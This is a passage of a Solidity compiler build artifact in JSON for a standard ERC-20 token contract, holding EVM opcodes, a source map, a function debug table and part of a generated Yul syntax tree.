SLOAD SWAP1 JUMP JUMPDEST PUSH2 0xB6 PUSH2 0x292 JUMP JUMPDEST PUSH2 0xDF PUSH2 0x175 CALLDATASIZE PUSH1 0x4 PUSH2 0x706 JUMP JUMPDEST PUSH2 0x2A1 JUMP JUMPDEST PUSH2 0xDF PUSH2 0x188 CALLDATASIZE PUSH1 0x4 PUSH2 0x706 JUMP JUMPDEST PUSH2 0x321 JUMP JUMPDEST PUSH2 0xF3 PUSH2 0x19B CALLDATASIZE PUSH1 0x4 PUSH2 0x78E JUMP JUMPDEST PUSH2 0x32F JUMP JUMPDEST PUSH1 0x60 PUSH1 0x3 DUP1 SLOAD PUSH2 0x1AF SWAP1 PUSH2 0x7C1 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x1DB SWAP1 PUSH2 0x7C1 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x228 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1FD JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x228 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x20B JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 CALLER PUSH2 0x240 DUP2 DUP6 DUP6 PUSH2 0x35A JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 CALLER PUSH2 0x25A DUP6 DUP3 DUP6 PUSH2 0x47E JUMP JUMPDEST PUSH2 0x265 DUP6 DUP6 DUP6 PUSH2 0x4F8 JUMP JUMPDEST POP PUSH1 0x1 SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 CALLER PUSH2 0x240 DUP2 DUP6 DUP6 PUSH2 0x283 DUP4 DUP4 PUSH2 0x32F JUMP JUMPDEST PUSH2 0x28D SWAP2 SWAP1 PUSH2 0x7FB JUMP JUMPDEST PUSH2 0x35A JUMP JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 SLOAD PUSH2 0x1AF SWAP1 PUSH2 0x7C1 JUMP JUMPDEST PUSH1 0x0 CALLER DUP2 PUSH2 0x2AF DUP3 DUP7 PUSH2 0x32F JUMP JUMPDEST SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x314 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x25 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A2064656372656173656420616C6C6F77616E63652062656C6F77 PUSH1 0x44 DUP3 ADD MSTORE PUSH5 0x207A65726F PUSH1 0xD8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x265 DUP3 DUP7 DUP7 DUP5 SUB PUSH2 0x35A JUMP JUMPDEST PUSH1 0x0 CALLER PUSH2 0x240 DUP2 DUP6 DUP6 PUSH2 0x4F8 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP4 SWAP1 SWAP5 AND DUP3 MSTORE SWAP2 SWAP1 SWAP2 MSTORE KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x3BC JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP1 DUP3 ADD MSTORE PUSH32 0x45524332303A20617070726F76652066726F6D20746865207A65726F20616464 PUSH1 0x44 DUP3 ADD MSTORE PUSH4 0x72657373 PUSH1 0xE0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x30B JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0x41D JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x22 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A20617070726F766520746F20746865207A65726F206164647265 PUSH1 0x44 DUP3 ADD MSTORE PUSH2 0x7373 PUSH1 0xF0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x30B JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE SWAP1 MLOAD DUP5 DUP2 MSTORE PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP2 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x48A DUP5 DUP5 PUSH2 0x32F JUMP JUMPDEST SWAP1 POP PUSH1 0x0 NOT DUP2 EQ PUSH2 0x4F2 JUMPI DUP2 DUP2 LT ISZERO PUSH2 0x4E5 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1D PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A20696E73756666696369656E7420616C6C6F77616E6365000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x30B JUMP JUMPDEST PUSH2 0x4F2 DUP5 DUP5 DUP5 DUP5 SUB PUSH2 0x35A JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x55C JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x25 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E736665722066726F6D20746865207A65726F206164 PUSH1 0x44 DUP3 ADD MSTORE PUSH5 0x6472657373 PUSH1 0xD8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x30B JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0x5BE JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x23 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E7366657220746F20746865207A65726F2061646472 PUSH1 0x44 DUP3 ADD MSTORE PUSH3 0x657373 PUSH1 0xE8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x30B JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x20 DUP2 SWAP1 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 DUP2 LT ISZERO PUSH2 0x636 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x26 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E7366657220616D6F756E7420657863656564732062 PUSH1 0x44 DUP3 ADD MSTORE PUSH6 0x616C616E6365 PUSH1 0xD0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x30B JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 DUP2 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x20 DUP2 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP8 DUP8 SUB SWAP1 SSTORE SWAP4 DUP8 AND DUP1 DUP4 MSTORE SWAP2 DUP5 SWAP1 KECCAK256 DUP1 SLOAD DUP8 ADD SWAP1 SSTORE SWAP3 MLOAD DUP6 DUP2 MSTORE SWAP1 SWAP3 PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP2 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH2 0x4F2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP1 DUP4 MSTORE DUP4 MLOAD DUP1 DUP3 DUP6 ADD MSTORE PUSH1 0x0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x6C9 JUMPI DUP6 DUP2 ADD DUP4 ADD MLOAD DUP6 DUP3 ADD PUSH1 0x40 ADD MSTORE DUP3 ADD PUSH2 0x6AD JUMP JUMPDEST POP PUSH1 0x0 PUSH1 0x40 DUP3 DUP7 ADD ADD MSTORE PUSH1 0x40 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND DUP6 ADD ADD SWAP3 POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP1 CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x701 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x719 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x722 DUP4 PUSH2 0x6EA JUMP JUMPDEST SWAP5 PUSH1 0x20 SWAP4 SWAP1 SWAP4 ADD CALLDATALOAD SWAP4 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x745 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x74E DUP5 PUSH2 0x6EA JUMP JUMPDEST SWAP3 POP PUSH2 0x75C PUSH1 0x20 DUP6 ADD PUSH2 0x6EA JUMP JUMPDEST SWAP2 POP PUSH1 0x40 DUP5 ADD CALLDATALOAD SWAP1 POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x77E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x787 DUP3 PUSH2 0x6EA JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x7A1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x7AA DUP4 PUSH2 0x6EA JUMP JUMPDEST SWAP2 POP PUSH2 0x7B8 PUSH1 0x20 DUP5 ADD PUSH2 0x6EA JUMP JUMPDEST SWAP1 POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x1 DUP2 DUP2 SHR SWAP1 DUP3 AND DUP1 PUSH2 0x7D5 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0x7F5 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP1 DUP3 ADD DUP1 DUP3 GT ISZERO PUSH2 0x246 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD4 LOG0 EXTCODEHASH CHAINID DUP2 PUSH14 0x8ABC72FD918A2322F2A3C568A203 XOR 0xB1 PUSH30 0xFD2264E68A262D9D2764736F6C6343000812003300000000000000000000 ",
							"sourceMap": "1532:11312:0:-:0;;;1980:113;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;2046:5;:13;2054:5;2046;:13;:::i;:::-;-1:-1:-1;2069:7:0;:17;2079:7;2069;:17;:::i;:::-;;1980:113;;1532:11312;;14:127:5;75:10;70:3;66:20;63:1;56:31;106:4;103:1;96:15;130:4;127:1;120:15;146:840;200:5;253:3;246:4;238:6;234:17;230:27;220:55;;271:1;268;261:12;220:55;294:13;;-1:-1:-1;;;;;356:10:5;;;353:36;;;369:18;;:::i;:::-;444:2;438:9;412:2;498:13;;-1:-1:-1;;494:22:5;;;518:2;490:31;486:40;474:53;;;542:18;;;562:22;;;539:46;536:72;;;588:18;;:::i;:::-;628:10;624:2;617:22;663:2;655:6;648:18;685:4;675:14;;730:3;725:2;720;712:6;708:15;704:24;701:33;698:53;;;747:1;744;737:12;698:53;769:1;760:10;;779:133;793:2;790:1;787:9;779:133;;;881:14;;;877:23;;871:30;850:14;;;846:23;;839:63;804:10;;;;779:133;;;954:1;932:15;;;928:24;;;921:35;;;;936:6;146:840;-1:-1:-1;;;;146:840:5:o;991:562::-;1090:6;1098;1151:2;1139:9;1130:7;1126:23;1122:32;1119:52;;;1167:1;1164;1157:12;1119:52;1194:16;;-1:-1:-1;;;;;1259:14:5;;;1256:34;;;1286:1;1283;1276:12;1256:34;1309:61;1362:7;1353:6;1342:9;1338:22;1309:61;:::i;:::-;1299:71;;1416:2;1405:9;1401:18;1395:25;1379:41;;1445:2;1435:8;1432:16;1429:36;;;1461:1;1458;1451:12;1429:36;;1484:63;1539:7;1528:8;1517:9;1513:24;1484:63;:::i;:::-;1474:73;;;991:562;;;;;:::o;1558:380::-;1637:1;1633:12;;;;1680;;;1701:61;;1755:4;1747:6;1743:17;1733:27;;1701:61;1808:2;1800:6;1797:14;1777:18;1774:38;1771:161;;1854:10;1849:3;1845:20;1842:1;1835:31;1889:4;1886:1;1879:15;1917:4;1914:1;1907:15;1771:161;;1558:380;;;:::o;2069:545::-;2171:2;2166:3;2163:11;2160:448;;;2207:1;2232:5;2228:2;2221:17;2277:4;2273:2;2263:19;2347:2;2335:10;2331:19;2328:1;2324:27;2318:4;2314:38;2383:4;2371:10;2368:20;2365:47;;;-1:-1:-1;2406:4:5;2365:47;2461:2;2456:3;2452:12;2449:1;2445:20;2439:4;2435:31;2425:41;;2516:82;2534:2;2527:5;2524:13;2516:82;;;2579:17;;;2560:1;2549:13;2516:82;;;2520:3;;;2160:448;2069:545;;;:::o;2790:1352::-;2910:10;;-1:-1:-1;;;;;2932:30:5;;2929:56;;;2965:18;;:::i;:::-;2994:97;3084:6;3044:38;3076:4;3070:11;3044:38;:::i;:::-;3038:4;2994:97;:::i;:::-;3146:4;;3210:2;3199:14;;3227:1;3222:663;;;;3929:1;3946:6;3943:89;;;-1:-1:-1;3998:19:5;;;3992:26;3943:89;-1:-1:-1;;2747:1:5;2743:11;;;2739:24;2735:29;2725:40;2771:1;2767:11;;;2722:57;4045:81;;3192:944;;3222:663;2016:1;2009:14;;;2053:4;2040:18;;-1:-1:-1;;3258:20:5;;;3376:236;3390:7;3387:1;3384:14;3376:236;;;3479:19;;;3473:26;3458:42;;3571:27;;;;3539:1;3527:14;;;;3406:19;;3376:236;;;3380:3;3640:6;3631:7;3628:19;3625:201;;;3701:19;;;3695:26;-1:-1:-1;;3784:1:5;3780:14;;;3796:3;3776:24;3772:37;3768:42;3753:58;3738:74;;3625:201;-1:-1:-1;;;;;3872:1:5;3856:14;;;3852:22;3839:36;;-1:-1:-1;2790:1352:5:o;:::-;1532:11312:0;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@_afterTokenTransfer_585": {
									"entryPoint": null,
									"id": 585,
									"parameterSlots": 3,
									"returnSlots": 0
								},
								"@_approve_520": {
									"entryPoint": 858,
									"id": 520,
									"parameterSlots": 3,
									"returnSlots": 0
								},
								"@_beforeTokenTransfer_574": {
									"entryPoint": null,
									"id": 574,
									"parameterSlots": 3,
									"returnSlots": 0
								},
								"@_msgSender_701": {
									"entryPoint": null,
									"id": 701,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"@_spendAllowance_563": {
									"entryPoint": 1150,
									"id": 563,
									"parameterSlots": 3,
									"returnSlots": 0
								},
								"@_transfer_346": {
									"entryPoint": 1272,
									"id": 346,
									"parameterSlots": 3,
									"returnSlots": 0
								},
								"@allowance_141": {
									"entryPoint": 815,
									"id": 141,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"@approve_166": {
									"entryPoint": 562,
									"id": 166,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"@balanceOf_98": {
									"entryPoint": null,
									"id": 98,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"@decimals_74": {
									"entryPoint": null,
									"id": 74,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"@decreaseAllowance_269": {
									"entryPoint": 673,
									"id": 269,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"@increaseAllowance_228": {
									"entryPoint": 624,
									"id": 228,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"@name_54": {
									"entryPoint": 416,
									"id": 54,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"@symbol_64": {
									"entryPoint": 658,
									"id": 64,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"@totalSupply_84": {
									"entryPoint": null,
									"id": 84,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"@transferFrom_199": {
									"entryPoint": 588,
									"id": 199,
									"parameterSlots": 3,
									"returnSlots": 1
								},
								"@transfer_123": {
									"entryPoint": 801,
									"id": 123,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_address": {
									"entryPoint": 1770,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_address": {
									"entryPoint": 1900,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_addresst_address": {
									"entryPoint": 1934,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 2
								},
								"abi_decode_tuple_t_addresst_addresst_uint256": {
									"entryPoint": 1840,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 3
								},
								"abi_decode_tuple_t_addresst_uint256": {
									"entryPoint": 1798,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 2
								},
								"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": 1692,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_0557e210f7a69a685100a7e4e3d0a7024c546085cee28910fd17d0b081d9516f__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_24883cc5fe64ace9d0df1893501ecb93c77180f0ff69cca79affb3c316dc8029__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_3b6607e091cba9325f958656d2b5e0622ab7dc0eac71a26ac788cb25bc19f4fe__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_4107e8a8b9e94bf8ff83080ddec1c0bffe897ebc2241b89d44f66b3d274088b6__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_baecc556b46f4ed0f2b4cb599d60785ac8563dd2dc0a5bf12edea1c39e5e1fea__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_c953f4879035ed60e766b34720f656aab5c697b141d924c283124ecedb91c208__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_f8b476f7d28209d77d4a4ac1fe36b9f8259aa1bb6bddfa6e89de7e51615cf8a8__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_uint8__to_t_uint8__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_add_t_uint256": {
									"entryPoint": 2043,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"extract_byte_array_length": {
									"entryPoint": 1985,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:5754:5",
										"statements": [
											{
												"nodeType": "YulBlock",
												"src": "6:3:5",
												"statements": []
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "135:427:5",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "145:12:5",
															"value": {
																"kind": "number",
																"nodeType": "YulLiteral",
																"src": "155:2:5",
																"type": "",
																"value": "32"
															},
															"variables": [
																{
																	"name": "_1",
																	"nodeType": "YulTypedName",
																	"src": "149:2:5",
																	"type": ""
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "173:9:5"
																	},
																	{
																		"name": "_1",
																		"nodeType": "YulIdentifier",
																		"src": "184:2:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "166:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "166:21:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "166:21:5"
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "196:27:5",
															"value": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "216:6:5"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "210:5:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "210:13:5"
															},
															"variables": [
																{
																	"name": "length",
																	"nodeType": "YulTypedName",
																	"src": "200:6:5",
																	"type": ""
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "243:9:5"
																			},
																			{
																				"name": "_1",
																				"nodeType": "YulIdentifier",
																				"src": "254:2:5"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "239:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "239:18:5"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "259:6:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "232:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "232:34:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "232:34:5"
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "275:10:5",
															"value": {
																"kind": "number",
																"nodeType": "YulLiteral",
																"src": "284:1:5",
																"type": "",
																"value": "0"
															},
															"variables": [
																{
																	"name": "i",
																	"nodeType": "YulTypedName",
																	"src": "279:1:5",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "344:90:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"arguments": [
																								{
																									"name": "headStart",
																									"nodeType": "YulIdentifier",
																									"src": "373:9:5"
																								},
																								{
																									"name": "i",
																									"nodeType": "YulIdentifier",
																									"src": "384:1:5"
																								}
																							],
																							"functionName": {
																								"name": "add",
																								"nodeType": "YulIdentifier",
																								"src": "369:3:5"
																							},
																							"nodeType": "YulFunctionCall",
																							"src": "369:17:5"
																						},
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "388:2:5",
																							"type": "",
																							"value": "64"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "365:3:5"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "365:26:5"
																				},
																				{
																					"arguments": [
																						{
																							"arguments": [
																								{
																									"arguments": [
																										{
																											"name": "value0",
																											"nodeType": "YulIdentifier",
																											"src": "407:6:5"
																										},
																										{
																											"name": "i",
																											"nodeType": "YulIdentifier",
																											"src": "415:1:5"
																										}
																									],
																									"functionName": {
																										"name": "add",
																										"nodeType": "YulIdentifier",
																										"src": "403:3:5"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "403:14:5"
																								},
																								{
																									"name": "_1",
																									"nodeType": "YulIdentifier",
																									"src": "419:2:5"
																								}
																							],
																							"functionName": {
																								"name": "add",
																								"nodeType": "YulIdentifier",
																								"src": "399:3:5"
																							},
																							"nodeType": "YulFunctionCall",
																							"src": "399:23:5"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "393:5:5"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "393:30:5"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "358:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "358:66:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "358:66:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "i",
																		"nodeType": "YulIdentifier",
																		"src": "305:1:5"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "308:6:5"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "302:2:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "302:13:5"
															},
															"nodeType": "YulForLoop",
															"post": {
																"nodeType": "YulBlock",
																"src": "316:19:5",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "318:15:5",
																		"value": {
																			"arguments": [
																				{
																					"name": "i",
																					"nodeType": "YulIdentifier",
																					"src": "327:1:5"
																				},
																				{
																					"name": "_1",
																					"nodeType": "YulIdentifier",
																					"src": "330:2:5"
																				}
																			],
																			"functionName": {
																				"name": "add",
																				"nodeType": "YulIdentifier",
																				"src": "323:3:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "323:10:5"
																		},
																		"variableNames": [
																			{
																				"name": "i",
																				"nodeType": "YulIdentifier",
																				"src": "318:1:5"
																			}
																		]
																	}
																]
															},
															"pre": {
																"nodeType": "YulBlock",
																"src": "298:3:5",
																"statements": []
															},
															"src": "294:140:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "458:9:5"
																					},
																					{
																						"name": "length",
																						"nodeType": "YulIdentifier",
																						"src": "469:6:5"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "454:3:5"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "454:22:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "478:2:5",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "450:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "450:31:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "483:1:5",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
